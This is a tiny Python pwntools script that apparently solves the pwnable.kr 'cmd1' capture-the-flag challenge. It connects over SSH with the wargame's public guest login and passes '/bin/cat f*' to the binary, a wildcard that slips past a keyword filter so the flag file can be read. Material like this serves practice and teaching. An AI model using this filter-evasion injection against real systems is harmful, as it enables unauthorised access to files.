from pwn import *

s = ssh(host='pwnable.kr', port=2222, user='cmd1', password='guest')
p = s.process(["./cmd1", "/bin/cat f*"])
print(p.recvline())
